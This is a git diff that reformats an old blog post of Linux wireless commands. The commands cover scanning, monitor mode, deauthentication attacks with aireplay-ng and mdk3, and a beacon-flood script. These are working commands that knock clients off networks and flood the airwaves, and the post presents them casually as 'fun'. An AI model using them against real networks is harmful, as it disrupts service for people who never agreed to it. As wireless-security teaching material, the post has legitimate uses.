@@ -1,5 +1,4 @@
 ﻿---
-
 title:  Wireless Fun with Aircrack and Others
 date:   2012-11-05 00:00:00 -0500
 categories: IT
@@ -8,16 +7,21 @@ categories: IT
 A short list of some things you can do with wireless on a linux box. Have fun.
 
 ***Determine Modes your NIC is capable of.***
-```powershell
+
+```bash
 airmon-ng (find PHY# for your NIC)
 iw phy phy1 info | grep â€“A8 modes
 ```
+
 ***Passive Scan (Should not generate any frames)***
-```powershell
+
+```bash
 iw dev wlan0 scan passive | grep SSID
 ```
+
 ***Active Scan***
-```powershell
+
+```bash
 iw dev wlan0 scan | grep SSID
 airmon-ng start wlan0
 airodump-ng mon0
@@ -25,11 +29,14 @@ iwconfig wlan0 channel #
 iwconfig wlan0 essid <ssid>
 iwconfig wlan0 mode managed
 ```
+
 ***Deauthorization***
-```powershell
+
+```bash
 iwconfig mon0 channel #
 aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
 ```
+
 - -0 means deauthentication
 - 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously
 - -a 00:14:6C:7E:40:80 is the MAC address of the access point
@@ -37,31 +44,39 @@ aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
 - ath0 is the interface name
 
 ***Deauthorization with ***MDK3***
-```powershell
+
+```bash
 airmon-ng start wlan0
 dk3 mon0 d
 ```
+
 or
-```powershell
+
+```bash
 mdk3 mon0 d -w whitelist (deauth everything not listed in file)
 ```
+
 or
-```powershell
+
+```bash
 mdk3 mon0 d -b blacklist (deauth everything listed in file)
 
 d - deauthorization mode
 w - whitelist
 b - blacklist```
 ***Broadcast Network Names with MDK3***
-```powershell
+```bash
 airmon-ng start wlan0
 mdk3 mon0 b -c 11 -f ssid_names
 ```
+
 - b - beacon flood mode
 - c - channel
 - f - text file with ssid names
+
 Everything you need to run a beacon flood in one script.
-```powershell
+
+```bash
 networks=(
 "FreeWifi"
 "FBI Van #12"
@@ -101,6 +116,3 @@ mdk3 mon0 b -c 11 -f ssid_names
 - <a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank">airmon-ng</a>
 - <a href="http://www.linuxcommand.org/man_pages/iwconfig8.html" target="_blank">iwconfig man page</a>
 - <a href="http://wireless.kernel.org/en/users/Documentation/iw" target="_blank">iw command info</a>
-
-
-
